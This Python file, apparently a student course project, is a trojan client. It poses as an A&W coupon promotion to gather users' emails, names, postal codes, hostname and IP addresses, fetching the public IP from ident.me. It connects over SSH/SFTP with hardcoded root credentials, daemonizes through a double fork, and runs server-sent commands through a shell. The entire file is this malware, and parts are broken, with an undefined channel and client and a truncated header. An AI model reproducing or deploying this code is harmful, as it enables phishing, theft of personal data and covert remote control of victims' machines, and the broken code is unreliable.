# test_client.py

#==============================================================================
 #   Assignment:  Major Project - Tunelling Milestone 1
 #
 #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
 #     Language:  Python 3
 #                      
 #   To Compile: Paramiko must be available 
 #
 #    Class:  DPI912 
 #    Professor:  Harvey Kaduri
 #    Due Date:  Mar 24th 2020 
 #    Submitted: Mar 22nd 2020
 #
 #-----------------------------------------------------------------------------
 #
 #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
 #      
 #        Input:  N/A
 #
 #       Output:  Outputs to console results of command executed
 #
 #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Continously request new commands and then send them to the target client. Await for 
 #               
 #             
 #   Required Features Not Included: N/A
 #
 #   Known Bugs:  N/A 
 #      
 #
 #   Classification: N/A
 #
#==============================================================================
import paramiko
import threading
import subprocess
import sys
import os
import re
import socket #to capture the local IP
import urllib.request # to capture the public ip




def fetchSFTP():
    '''
    This function handles the connection and creation of SSH and SFTP connections to a target server.
    When an exception occurs, disconnect from the server if possible.
    @returns - SFTP - A connected SFTP object 
    '''
    try:
        sftp = 0
        client = 0
        host = "::1"
        port = 9000
        usr,  pwd = 'root', 'toor'
        
        key = paramiko.RSAKey(filename='test_rsa.key')

        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host,port, usr, pwd,  key)
        
        sftp = client.open_sftp()
        sftp.sshclient = client
        
        #TEST FILE - TODO REMOVE
        file = open("mytestfile.txt",  "a")
        file.write("Runescape Sucks")
        file.close()
        sftp.put("mytestfile.txt",  "transported.txt")
        
        return sftp
    except Exception as e:
        print("Unhandled exception ->"+ str(e))
        if sftp != 0:
            sftp.close()
        if client != 0:
            client.close()
    
    #--------------End of fetch SFTP-----------#

def getInput():
    '''
    This function handles the input and validation of the program. 
    It also collects some secondary information related to an IP address.
    @returns - array - The array of voluntarily given information
    '''

    infoBank = list()
    detail = 0
    regexEmail = '^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$' # server should expect validated email

    print("Welcome to A&W Free Root Beer & Coupouns Promotion! \n")
    print("At A & W, we pride ourselves on getting to know our customers.\n By giving us your email, we promise to send you only the best deals straight from our hearts to yours.")
    while(detail == 0):
        email = input("Please enter an email to begin: ")         

        while not re.match(regexEmail, email): #validate an email
            email = input("That email doesnt look right. Try Again:")    
            
        print("Thanks! We only need your email, but for local offers we need more info. Enter more information?")
        
        while (detail != "Y") and (detail != "N"):
            detail = input("Y/N: ")
        
        if detail == "Y":
            firstName = input("Enter your first name: ")
            lastName = input("Enter your last name: ")
            postalCode = input("Enter your postal code for local offers: ")
            
        else:
            firstName = "Friendly"
            lastName = "User"
            postalCode = "K7P 1A3"

        name, local, public = getIPaddr() # could be flagged as suspicious traffic to ident.me ? 
        userInfo = [email,firstName,lastName,postalCode, name,local,public]
            
        print("Thank you! You are now signed up for free rewards. \
        \nWould you like to sign up another user?")
        detail = 0
        while (detail != "Y") and (detail != "N"):
            detail = input("Y/N: ")
        if detail == "Y":
            detail = 0

        infoBank.append(userInfo)
    
    print("Please visit http://www.awcoupon.ca/en and login using the email you provided and password of 'P@ssw0rd'")
    print("From our family to yours, thank you for choosing A&W. Goodbye!")
    return infoBank
     #---------------End of GetInput-----------------#

def getIPaddr():
    '''
    This function handles the capture of the user's private IP address, hostname, and public IP
    @returns - host, ip, external_ip
    '''
    ip = 0
    host = socket.gethostname()    
    ip = socket.gethostbyname(host)    
    external_ip = urllib.request.urlopen('https://ident.me').read().decode('utf8')

    return host, ip, external_ip    

while True:
    sftp = fetchSFTP()
    infoBank = getInput()
    try:
        pid = os.fork()
    except OSError:
        sys.stderr.write("Could not create a child process\n")
        continue

    with open('info_bank.txt', 'w') as f:
        for item in infoBank:
            f.write("%s\n" % item)
    
    #decouple from parent env
    os.chdir('/')
    try:
        os.setsid()
    except:
        pass
    os.umask(0)

    #double fork
    try:
        pid = os.fork()
    except OSError:
        sys.stderr.write("Could not create a child process\n")
        continue
        
    if pid > 0: #parent
        os._exit(0)
    
    ##double forked and detached##
    ##recieve commands from daemon here##

    command = chan.recv(1024)
    command = command.decode()
    print("Executing this -->" + str(command))
    result = str(command)
    try:
        # safe escape in case the server leaves us 
        if (result == 'stop' or result == ''):
            client.close()
            sys.exit(0)
        #exec this command, in future this would be os.system()
        proc = subprocess.check_output(command, shell=True)
        chan.send(proc)
    except Exception as e:
        print("An Error or interuption occurred. Continue As normal")
        chan.send('An Error or interuption occurred. Continue As normal')


client.close()
